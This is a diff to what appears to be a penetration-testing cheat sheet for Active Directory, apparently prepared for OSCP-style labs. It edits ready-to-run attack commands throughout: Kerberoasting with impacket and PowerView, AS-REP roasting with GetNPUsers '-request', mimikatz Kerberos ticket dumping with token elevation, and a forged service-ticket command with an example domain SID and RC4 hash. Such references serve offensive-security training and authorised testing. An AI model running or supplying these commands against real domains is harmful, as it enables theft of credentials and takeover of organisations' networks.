@@ -80,6 +80,7 @@ impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD>
 # Example
 impacket-GetUserSPNs corp.com/pete:MattLovesAutumn1
 Get-DomainSPNTicket -SPN http/files04.corp.com
+Get-DomainSPNTicket -SPN HTTP/MS01.oscp.exam
 ```
 
 
@@ -457,10 +458,10 @@ Get-DomainUser -PreauthNotRequired | select samaccountname
 # AS-REP Roasting
 ########################################
 # Impacket. From kali
-GetNPUsers.py <DOMAIN>/<user>:<password> -usersfile users.txt -format hashcat
+GetNPUsers.py <DOMAIN>/<user>:<password> -usersfile users.txt -format hashcat -request
 
 # Example
-GetNPUsers.py corp.com/pete:MattLovesAutumn1 -usersfile users.txt -dc-ip 192.168.185.70 -format hashcat
+GetNPUsers.py corp.com/pete:MattLovesAutumn1 -usersfile users.txt -dc-ip 192.168.185.70 -format hashcat -request
 ```
 
 
@@ -513,7 +514,7 @@ kerberos::list /export
 # Pass-the-Ticket (Kerberos ticket reuse)
 ########################################  
 # List kerberos tickets currently loadedand dump them  
-.\mimikatz.exe "kerberos::list /dump" "exit"  
+.\mimikatz.exe "token::elevate" "kerberos::list /dump" "exit"  
 
 # BASIC: Inject a kerberos ticket into the current session. Below more examples with different hashes.
 .\mimikatz.exe "kerberos::ptt <TGT_ticket.kirbi>" "exit"
@@ -733,7 +734,6 @@ impacket-getST -spn cifs/dc01.corp.local -impersonate administrator corp.local/w
 
 # Another example from offsec labs
 .\mimikatz.exe "kerberos::golden /user:jeffadmin /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /target:HTTP/web04.corp.com /service:iis_service /rc4:4d28cf5252d39971419580a51484ca09 /ptt" "exit"
-
 ```
 
 
